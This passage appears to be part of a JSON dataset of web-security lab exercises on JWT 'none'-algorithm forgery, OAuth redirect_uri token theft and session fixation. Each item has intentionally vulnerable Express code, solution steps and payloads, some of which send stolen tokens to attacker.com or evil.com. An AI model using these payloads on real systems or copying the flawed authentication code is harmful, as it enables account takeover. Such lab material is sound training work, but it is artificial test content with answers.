+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'secretkey123'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username, role: 'admin' }, SECRET); return res.json({ token }); } res.status(401).json({ error: 'Invalid login' }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const payload = jwt.verify(token, SECRET, { algorithms: ['HS256', 'none'] }); if (payload.role === 'admin') return res.send('Sensitive admin data'); res.status(403).send('Insufficient rights'); } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(4000);",
+  "payloads": [
+    "Header: {\"alg\":\"none\"}",
+    "Payload: {\"username\":\"admin\",\"role\":\"admin\"}",
+    "JWT (no signature): <base64(header)>.<base64(payload)>."
+  ]
+},
+{
+  "Lab scenario": "OAuth implicit flow misconfiguration leading to token theft via redirect URI manipulation",
+  "Lab Description": "The application integrates with a third-party OAuth provider but fails to validate redirect URIs properly in the implicit flow. An attacker can craft a malicious redirect URI pointing to their controlled domain, capturing the access token directly from the URL fragment. To solve: Capture Carlos's OAuth access token and use it to fetch his protected profile from /oauth/profile.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1. Analyze the OAuth login request using Burp Suite and note the response_type=token parameter indicating implicit flow.",
+    "2. Modify the redirect_uri parameter to point to a controlled domain (e.g., https://attacker.com/callback) and trick Carlos into visiting the modified authorization URL.",
+    "3. Capture the access token from the fragment (#access_token=...) once Carlos logs in.",
+    "4. Use Postman to send GET /oauth/profile with Authorization: Bearer <stolen_token>.",
+    "5. Confirm access to Carlos's data to solve the lab."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123xyz456' }; app.get('/auth', (req, res) => { const { redirect_uri, response_type, username } = req.query; if (response_type === 'token') { const token = tokens[username]; const redirect = `${redirect_uri}#access_token=${token}`; return res.redirect(redirect); } res.status(400).send('Invalid request'); }); app.get('/oauth/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123xyz456') return res.send('Carlos OAuth profile'); res.status(403).send('Invalid token'); }); app.listen(5000);",
+  "payloads": [
+    "GET /auth?response_type=token&redirect_uri=https://attacker.com/callback&username=carlos",
+    "Extract #access_token from redirected URL",
+    "GET /oauth/profile with Authorization: Bearer abc123xyz456"
+  ]
+},
+{
+  "Lab scenario": "Session Fixation in REST Login Flow",
+  "Lab Description": "This lab simulates a flawed session management implementation where a session ID can be pre-assigned and accepted post-authentication. The application fails to invalidate existing session cookies on login. To solve: Hijack Carlos's session after successful login by forcing him to use your pre-assigned session ID.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "Use Burp Suite Proxy to capture your login request and observe the `Set-Cookie: sid=...` header.",
+    "Send a crafted link to Carlos with the fixed session ID in the `Cookie` header using a phishing payload.",
+    "Log in using your own credentials to ensure session ID does not change.",
+    "Monitor for Carlos's session reuse using the pre-assigned session ID.",
+    "Access `/my-account` using the hijacked session token to confirm access."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'crimsonpass' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { let sid = req.cookies.sid || 'sess' + Math.floor(Math.random() * 10000); sessions[sid] = username; res.cookie('sid', sid); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Access denied'); }); app.listen(3001);",
+  "payloads": [
+    "Cookie: sid=sess6666",
+    "POST /login with pre-set sid cookie",
+    "Access victim's /my-account with fixed sid"
+  ]
+},
+{
+  "Lab scenario": "JWT None Algorithm in Authorization Header",
+  "Lab Description": "The application uses JWT tokens to authenticate GraphQL API requests, but fails to properly enforce the signing algorithm. The server accepts tokens signed with `alg: none`, allowing unauthorized access. To solve: Forge a token for Carlos and access his GraphQL user profile.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "Use Postman to capture an authenticated GraphQL request and extract the JWT from the Authorization header.",
+    "Decode the JWT using jwt.io and modify the payload to impersonate 'carlos', setting `alg` to `none` in the header.",
+    "Remove the signature part and craft a new Authorization header using the modified JWT.",
+    "Send a POST request to `/graphql` with a valid query (e.g., `{ me { username, email } }`).",
+    "Observe response showing Carlos's data to confirm the exploit."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: { email: 'carlos@example.com', role: 'user' } }; app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = payload; } else { jwt.verify(token, 'supersecret'); } } catch (e) { return res.status(401).send('Token error'); } res.json({ data: { me: users[req.user.username] } }); }); app.listen(3002);",
+  "payloads": [
+    "Authorization: Bearer <base64({alg: 'none'})>.<base64({username: 'carlos'})>.",
+    "POST /graphql with { me { username } }",
+    "Modified JWT token without signature"
+  ]
+},
+{
+  "Lab scenario": "OAuth Code Interception in Redirect URI",
+  "Lab Description": "This lab features an OAuth authorization implementation vulnerable to redirect URI manipulation. The app accepts unvalidated redirect URIs and sends valid authorization codes to attacker-controlled endpoints. To solve: Intercept Carlos’s authorization code and exchange it for an access token to access his profile.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "In Burp Suite, initiate OAuth login and intercept the `/authorize?client_id=...` request.",
+    "Modify the `redirect_uri` to point to your server (e.g., https://attacker.com/callback).",
+    "Send the malicious link to Carlos to trigger OAuth login.",
+    "Capture the `code` sent to your malicious callback endpoint.",
+    "Manually exchange the code using Postman with a POST to `/oauth/token` to retrieve Carlos’s token.",
+    "Use the token to send an authenticated GET request to `/profile` endpoint and view Carlos’s data."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'code') { const code = 'authcode123'; tokens[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid response type'); } }); app.post('/token', (req, res) => { const { code } = req.body; const user = tokens[code]; if (user) { res.json({ access_token: `token-${user}`, token_type: 'bearer' }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer token-carlos') res.send('Carlos Profile Data'); else res.status(403).send('Unauthorized'); }); app.listen(3003);",
+  "payloads": [
+    "https://vulnerable.com/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
+    "POST /token with code=authcode123",
+    "Authorization: Bearer token-carlos"
+  ]
+},
+{
+  "Lab scenario": "JWT None algorithm tampering in Authorization header",
+  "Lab Description": "The application uses JWT for authorization, but improperly handles the 'alg' field in tokens. The application accepts JWTs with the 'alg' value set to 'none', leading to signature bypass. To solve: forge a JWT for the admin user and access their protected dashboard.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1. Use Burp Suite to intercept an authenticated request and extract the JWT token from the Authorization header.",
+    "2. Decode the JWT token using jwt.io or Burp Decoder to analyze its payload and algorithm.",
+    "3. Modify the 'alg' field to 'none' and change the 'sub' claim to 'admin'. Remove the signature part entirely.",
+    "4. Replace the original Authorization header with the modified JWT: 'Authorization: Bearer <forged_token>' using Burp Repeater.",
+    "5. Send the request to the protected /admin endpoint and confirm successful access to the admin dashboard."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.get('/admin', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.sub === 'admin') return res.send('Welcome, admin'); return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === 'admin') return res.send('Welcome, admin'); else return res.status(403).send('Forbidden'); } catch { return res.status(400).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
+  "payloads": [
+    "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
+    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
+  ]
+},
+{
+  "Lab scenario": "OAuth implicit flow misconfiguration in redirect_uri validation",
+  "Lab Description": "The application implements OAuth 2.0 using the implicit grant flow but improperly validates the 'redirect_uri' parameter. This flaw allows redirection-based token theft. To solve: intercept and steal a victim's token by exploiting open redirect behavior.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1. Use OWASP ZAP to spider the app and find an OAuth flow starting with /auth endpoint.",
+    "2. Identify that the app uses implicit flow via response_type=token and passes a redirect_uri parameter.",
+    "3. Craft a malicious redirect_uri pointing to a domain you control (e.g., https://attacker.com/catch#token).",
+    "4. Trick a victim into clicking a login URL with your malicious redirect_uri.",
+    "5. Capture the access_token in the fragment part of the redirected URL at attacker.com.",
+    "6. Replay the access_token in an Authorization header to access the victim's profile."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (!client_id || !redirect_uri || response_type !== 'token') return res.status(400).send('Invalid request'); const user = 'carlos'; const accessToken = tokens[user]; res.redirect(`${redirect_uri}#access_token=${accessToken}&token_type=bearer`); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; if (token === tokens['carlos']) return res.send('Carlos Profile Page'); res.status(403).send('Invalid token'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Implicit Flow Lab running on http://localhost:${PORT}`));",
+  "payloads": [
+    "https://vulnerable.app/auth?client_id=123&redirect_uri=https://attacker.com/catch&response_type=token",
+    "Authorization: Bearer abc123token"
+  ]
+},
+{
+  "Lab scenario": "Session fixation via static session identifier in login flow",
+  "Lab Description": "The application fails to issue a new session ID after login, making it vulnerable to session fixation. An attacker can set a known session ID before login and force the victim to use it. To solve: hijack Carlos's session by fixing a session ID pre-authentication.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1. Use Burp Suite to intercept your own login and observe that the session cookie remains unchanged before and after authentication.",
+    "2. Craft a phishing page or email to lure Carlos into logging in while having a pre-set session cookie (e.g., session=attacker123).",
+    "3. Set the session cookie manually in Burp Repeater and simulate login as Carlos from the victim side.",
+    "4. On the attacker side, send a request using the same fixed session ID: Cookie: session=attacker123.",
+    "5. Access Carlos's account page using the hijacked session to solve the lab."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': 'qwerty123' }; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.query; const sess = req.cookies.session || 'anonymous'; if (users[username] === password) { sessions[sess] = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/account', (req, res) => { const sess = req.cookies.session; if (sessions[sess] === 'carlos') res.send('Carlos Account'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
+  "payloads": [
+    "Cookie: session=attacker123",
+    "POST /login?username=carlos&password=qwerty123",
+    "GET /account with Cookie: session=attacker123"
+  ]
+},
+{
+  "Lab scenario": "Session Fixation in REST Login Flow",
+  "Lab Description": "This lab is vulnerable to session fixation. The application sets a session cookie before authentication and does not issue a new one after login. To solve: hijack Carlos's session using a fixed session ID and access his account dashboard.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1.Using Burp Suite, send a GET request to /login to receive a session cookie before authentication.",
+    "2.Use Burp Repeater to send a crafted login POST request with valid credentials and the pre-issued session ID.",
+    "3.Observe that the session ID remains unchanged post-authentication.",
+    "4.Share the fixed session ID with Carlos (simulate XSS or phishing scenario) and have him authenticate using it.",
+    "5.Use the same fixed session ID to access /dashboard and verify access to Carlos’s account."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixed-session-secret', resave: false, saveUninitialized: true })); app.use(bodyParser.json()); const users = { carlos: 'letmein123' }; app.get('/login', (req, res) => { res.send('Login form'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { req.session.authenticated = true; req.session.user = username; res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/dashboard', (req, res) => { if (req.session.authenticated) { res.send(`Welcome ${req.session.user}`); } else { res.status(403).send('Forbidden'); } }); app.listen(3000);",
+  "payloads": [
+    "GET /login",
+    "POST /login {\"username\":\"carlos\",\"password\":\"letmein123\"} with session cookie manually set",
+    "GET /dashboard with fixed session cookie"
+  ]
+},
+{
+  "Lab scenario": "JWT Signature Algorithm Confusion in GraphQL Auth",
+  "Lab Description": "This GraphQL-based application uses JWTs for authentication. It accepts 'none' as the JWT algorithm and fails to validate the token signature. To solve: forge a token using 'none' algorithm and access Carlos's profile via a GraphQL query.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1.Use Postman to intercept a valid JWT after logging in with any user.",
+    "2.Decode the JWT using jwt.io and inspect the 'alg' field.",
+    "3.Replace the 'alg' with 'none' and change the payload to impersonate 'carlos'.",
+    "4.Remove the signature part and re-encode the header and payload.",
+    "5.Send a GraphQL request using the forged token in the Authorization header to access Carlos’s profile."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'securepass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.post('/graphql', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.replace('Bearer ', ''); try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(decoded.payload, 'base64').toString()); return res.send(`Welcome ${payload.user}`); } const verified = jwt.verify(token, 'secret'); res.send(`Welcome ${verified.user}`); } catch { res.status(403).send('Forbidden'); } }); app.listen(4000);",
+  "payloads": [
+    "JWT with header {\"alg\":\"none\"}",
+    "Payload {\"user\":\"carlos\"}",
+    "GraphQL POST: {\"query\":\"{ profile { name } }\"} with forged JWT"
+  ]
+},
+{
+  "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
+  "Lab Description": "This OAuth integration leaks authorization codes via a poorly validated redirect_uri parameter. To solve: intercept Carlos’s OAuth code via open redirect and exchange it for an access token to view his profile.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1.Use Burp Suite to initiate an OAuth login flow and capture the redirect_uri parameter.",
+    "2.Modify redirect_uri to point to your controlled domain (use collaborator or custom HTTP server).",
+    "3.Phish Carlos into clicking the modified authorization URL.",
+    "4.On code interception, exchange the stolen code at the /token endpoint to obtain an access token.",
+    "5.Use the token in an API request to GET /api/profile and confirm access to Carlos’s data."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const tokens = {}; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id === 'trusted' && response_type === 'code') { const code = 'oauthcode-carlos'; res.redirect(`${redirect_uri}?code=${code}`); } else { res.status(400).send('Invalid'); } }); app.post('/token', (req, res) => { const { code } = req.body; if (code === 'oauthcode-carlos') { const token = 'access-token-carlos'; tokens[token] = 'carlos'; res.json({ access_token: token }); } else { res.status(400).send('Invalid code'); } }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (auth && tokens[auth.replace('Bearer ', '')]) { res.send(`Profile: ${tokens[auth.replace('Bearer ', '')]}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(5000);",
+  "payloads": [
+    "GET /authorize?client_id=trusted&redirect_uri=http://evil.com/capture&response_type=code",
+    "Intercepted Code: oauthcode-carlos",
+    "POST /token with body {\"code\":\"oauthcode-carlos\"}",
+    "GET /api/profile with Authorization: Bearer access-token-carlos"
+  ]
+},
+{
+  "Lab scenario": "Session Fixation in login endpoint via Cookie Parameter Injection",
+  "Lab Description": "The application allows a session identifier to be set via a request cookie prior to authentication. This behavior allows an attacker to fixate a session and hijack the victim's account after they log in. The application accepts and reuses session tokens passed through cookies even before login. To solve: hijack Carlos's session post-login using a fixated session value.",
+  "Difficulty Level": "Medium",
+  "Solution Steps": [
+    "1.Using Burp Suite, send a GET /login request with a custom session cookie (e.g., sessionId=attacker123).",
+    "2.Log in using your own credentials and observe that the session cookie value persists post-authentication.",
+    "3.Log out and craft a phishing link that sets sessionId=attacker123 in the victim’s browser using a Cookie injection or XSS simulation.",
+    "4.After the victim logs in using the fixated session ID, capture the same sessionId value from your Burp proxy.",
+    "5.Use the sessionId=attacker123 to access /my-account and verify account hijack."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.sessionId || Math.random().toString(36).substring(2); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); sessions[sessionId] = username; res.cookie('sessionId', sessionId); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionId]; if (username) res.send(`Welcome ${username}`); else res.status(401).send('Unauthorized'); }); app.listen(3000);",
+  "payloads": [
+    "Cookie: sessionId=attacker123",
+    "Phishing link: <img src='http://vulnerable.site/login' onload='document.cookie=\"sessionId=attacker123\"'>"
+  ]
+},
+{
+  "Lab scenario": "JWT Key Confusion via Algorithm Manipulation",
+  "Lab Description": "The application uses JWTs for authentication but does not enforce strong algorithm validation, enabling algorithm substitution. The app accepts JWTs signed using 'none' or changes in algorithm headers. To solve: craft a JWT for Carlos without a valid key using the 'none' algorithm and access his account.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1.Use Burp Suite or Postman to intercept an authenticated request and capture the JWT in Authorization header.",
+    "2.Decode the JWT using jwt.io and note the algorithm is set to 'HS256'.",
+    "3.Change the algorithm to 'none' and modify the payload to { \"username\": \"carlos\" }.",
+    "4.Remove the JWT signature completely, re-encode the token and replace the Authorization header with it.",
+    "5.Send the request to /my-account endpoint and verify Carlos's session access."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'hardcoded-secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${decoded.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
+  "payloads": [
+    "JWT header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
+    "JWT payload: { \"username\": \"carlos\" }",
+    "Authorization: Bearer <unsigned_token>"
+  ]
+},
+{
+  "Lab scenario": "OAuth Misconfiguration in Token Validation Logic",
+  "Lab Description": "The application integrates with an external OAuth provider but does not properly validate the 'aud' claim or client ID. This allows attackers to use a token issued for a different client application to gain access. To solve: obtain an OAuth token from a 3rd-party client and use it to access Carlos's protected account.",
+  "Difficulty Level": "Hard",
+  "Solution Steps": [
+    "1.Use Postman or OAuth debugger to generate an OAuth token using a public client ID (e.g., demo-client).",
+    "2.Inspect the decoded token payload and confirm that the 'sub' or 'email' field is set to carlos@example.com.",
+    "3.Send a request to /my-account with the Authorization header set to Bearer <token>.",
+    "4.Observe that the server accepts the token despite the incorrect client application, due to weak audience validation.",
+    "5.Access protected user data and solve the lab."
+  ],
+  "Vulnerability name": "Authentication",
+  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.email === 'carlos@example.com') res.send('Carlos Account Accessed'); else res.status(403).send('Access denied'); } catch { res.status(403).send('Invalid token'); } }); app.listen(5000);",
+  "payloads": [
+    "OAuth token from demo-client with sub: carlos@example.com",
+    "Authorization: Bearer <demo-client-token>",
+    "Use OAuth2 playground to generate token for public audience"
+  ]
+},
+  {
+    "Lab scenario": "Session fixation via unrotated session token post-login",
+    "Lab Description": "This lab’s session handling is vulnerable due to the reuse of session tokens across unauthenticated and authenticated states. The application assigns a session token prior to login and does not rotate it after successful authentication. To solve: Hijack Carlos's session after fixation and access his My account page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Initiate a session with the application using OWASP ZAP to capture the initial Set-Cookie header.",
+      "Send the pre-login session cookie to the victim (Carlos) via a simulated phishing email or reflected XSS vector.",
+      "Wait for Carlos to authenticate with the fixed session ID (simulate or mock session binding).",
+      "Use the same session token in your client to access authenticated resources like /account or /profile.",
+      "Confirm session takeover by visiting /my-account and observing Carlos's account details."
+    ],
+    "Vulnerability name": "Authentication",
+    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const app = express(); app.use(cookieParser()); app.use(session({ secret: 'fixation-key', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'abc123' }]; app.get('/', (req, res) => { if (!req.session.user) { req.session.user = 'guest'; } res.send(`Session active for ${req.session.user}`); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send(`Welcome ${username}`); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') { res.send('Carlos account data'); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
+    "payloads": [
+      "Set-Cookie: connect.sid=SESSION_ID_HERE",
+      "POST /login with hijacked session ID",
+      "GET /my-account using fixed session"
+    ]
+  },
+  {
+    "Lab scenario": "JWT tampering via 'none' algorithm bypass",
+    "Lab Description": "This lab uses JWTs for session management but fails to enforce signature validation when the 'alg' header is set to 'none'. The application decodes the JWT without verifying its integrity. To solve: Forge a JWT granting access to Carlos's account and retrieve his profile.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Capture a valid JWT after logging in using Burp Suite. Decode it using jwt.io or Burp Decoder.",
+      "Replace the alg field with 'none' and modify the payload to set username to 'carlos'.",
+      "Remove the signature portion of the JWT entirely.",
+      "Use Postman to resend a request to /profile with the forged JWT in the Authorization header.",
+      "Verify access to Carlos's account page using the manipulated token."
+    ],
+    "Vulnerability name": "Authentication",
+    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtweak' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, 'secretkey', { algorithm: 'HS256' }); res.json({ token }); } else { res.status(403).send('Invalid'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); res.send(`Profile: ${payload.username}`); }); app.listen(3000);",
+    "payloads": [
+      "Header: {\"alg\":\"none\"}",
+      "Payload: {\"username\":\"carlos\"}",
+      "JWT: base64(header).base64(payload). (no signature)",
+      "Authorization: Bearer [forged JWT]"
+    ]
+  },
+  {
+    "Lab scenario": "OAuth misconfiguration with open redirect as token delivery",
+    "Lab Description": "This lab implements OAuth login but misuses the redirect_uri parameter without validation, enabling token leakage via open redirect. To solve: Hijack Carlos's OAuth token using a crafted redirect_uri and access his account page.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Inspect the OAuth flow using Burp Suite by initiating login with OAuth and intercepting the redirect.",
+      "Observe the redirect_uri parameter pointing to a callback endpoint.",
+      "Modify the redirect_uri to a malicious domain you control (use Burp Collaborator or webhook.site).",
+      "Send the malicious login URL to the victim (simulate or script Carlos visiting the link).",
+      "Collect the leaked OAuth token from the redirect on your domain and use it in the Authorization header to access /my-account."
+    ],
+    "Vulnerability name": "Authentication",
+    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const users = [{ username: 'carlos', token: 'abc123' }]; app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; const token = 'abc123'; const uri = `${redirect_uri}?token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.token || req.headers['authorization']; if (token === 'abc123') { res.send('Carlos account data'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
+    "payloads": [
+      "https://vulnerable.site/auth?redirect_uri=https://attacker.com/callback",
+      "Captured token: abc123",
+      "GET /my-account?token=abc123",
+      "Authorization: abc123"
+    ]
+  }
+]
